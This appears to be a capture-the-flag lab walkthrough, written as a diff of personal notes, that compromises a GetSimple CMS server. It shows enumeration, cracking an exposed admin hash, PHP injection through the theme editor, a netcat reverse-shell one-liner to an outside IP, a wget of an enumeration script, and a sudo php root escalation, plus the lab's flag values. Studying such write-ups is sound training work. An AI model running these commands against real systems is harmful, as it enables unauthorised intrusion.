@@ -1,0 +1,110 @@
+ran nmap -sV --open initial_scan_of_knowledge_check_mod [ip]
+    - 22 port open, OpenSSH 8.2p1 Ubuntu
+    - 80 port open, Apache 2.4.41
+
+
+ran nmap -p- --open -oa open_tcp_port_knowledge_check_mod [ip]
+    - nothing new shown
+
+
+ran nmap -sC -p [22,80] -oA port_scan_knowledge_check [ip]
+ - PORT   STATE SERVICE
+    22/tcp open  ssh
+| ssh-hostkey: 
+|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
+|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
+|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
+    80/tcp open  http
+    | http-robots.txt: 1 disallowed entry 
+    |_/admin/
+    |_http-title: Welcome to GetSimple! - [domain]
+
+
+ran nmap -sV --script=http-enum -oA script_knowledge_check_mod [ip]
+- no new information
+
+ran whatweb [ip]
+ - http://[ip] [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5,
+  HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)],
+  IP[[ip]], Script[text/javascript], Title[Welcome to GetSimple! - [domain]]
+
+
+ran gobuster dir -u http://[ip]/admin/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+- Found /template , /lang, and /inc, nothing immediatey noteworthy
+
+ran gobuster dir -u http://[ip]/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+- Found /data , /plugins, /theme
+- Inside of /data, found /users/admin.xml, which contained the following:
+            <item>
+            <USR>admin</USR>
+            <NAME/>
+            <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
+            <EMAIL>admin@[domain].com</EMAIL>
+            <HTMLEDITOR>1</HTMLEDITOR>
+            <TIMEZONE/>
+            <LANG>en_US</LANG>
+            </item>
+
+Username: admin
+pwd: d033e22ae348aeb5660fc2140aec35850c4da997
+email: admin@[domain].com
+
+entered username password combo into http://[ip]/admin/ , didn't immediately work, but this looks like hashed data, so we'll try to decrypt
+ran that through https://hashes.com/en/decrypt/hash -> d033e22ae348aeb5660fc2140aec35850c4da997:admin
+
+Updated Username/Password: admin - admin -> worked logging into /admin
+    - Looked through admin panel, found where we can download more plugins, possible avenue is to
+    find a compromised plugin that we can download to the server, then crack that plugin?
+    - unfortunately downloading a plugin and actually uploading the plugin for use seems broken
+    - under the files tab, there's a "Upload files and/or images..." button that doesn't work when clicked
+     maybe there's some way I can get that to work and we can upload a little script?
+
+Lets try SSH'ing into the ssh server with our admin password
+- ssh admin@[ip]
+password: admin
+- Permission denied
+
+
+Scrolling through the website some more, I came across the Theme sub category, and inside it the Theme editor.
+    - It looks like Theme editor lets you edit the PHP file of the theme, and just put your own PHP code into the theme file.
+    - I'm gonna try to see if I can get remote code execution
+    - I placed <?php system('id'); ?> into the text box editor, saved it, and navigated to where themes are stored on the server
+    - http://[ip]/theme/Innovation/template.php
+        - returns uid=33(www-data) gid=33(www-data) groups=33(www-data) , which means I can get code execution LETS GOOOO
+    - Now let's get a reverse shell going.
+        - I swapped out the text I replaced with a new command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.155 1234 >/tmp/f
+        - Then ran a listener with nc -lvnp 1234 on a terminal, and navigated back to /template.php
+            - Connection Acquired
+    - Now that I have a reverse shell, I need to get updated TTY access: ran python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Officially have a reverse shell with good TTY permissions on the remote server, www-data@[domain]
+
+Now it's time for to look around and see if we can do priviledge escalation
+    - after shuffling through for a bit, found /home/mrb3n/user.txt > 7002d65b149b0a4d19132a66feed21d8
+
+user flag found, now it's time to try to escalate to root and grab the root flag.
+
+Gonna try to run LinEum.sh on the user, so it's time to try to upload a file from my system to theirs.
+    - Opened a python port on the home system with sudo python3 -m http.server 8080
+    - Then ran wget http://10.10.14.155:8080/LinEnum.sh
+        - Unfortunately I'm getting access denied, so all good
+
+
+Ran sudo -l, found out the php command is sudo-able with no password
+    - Gonna sudo a reverse shell command at 8484 port and see if I can get root access that way
+        - after trying a million different commands and almost getting shell access a few times, found on this website: https://gtfobins.github.io/gtfobins/php/
+        all sorts of neat stuff you can do with sudo php access
+        - CMD="/bin/sh"
+        - sudo php -r "system('$CMD');"
+        - got me a shell, then used python3 -c 'import pty; pty.spawn("/bin/bash")' to get updated TTY and confirm this actually is root
+
+Navigated to root/root.txt and found the flag: f1fba6e9f71efb2630e6e34da6387842
+
+I WIN
+        
+
+
+
+
+
+
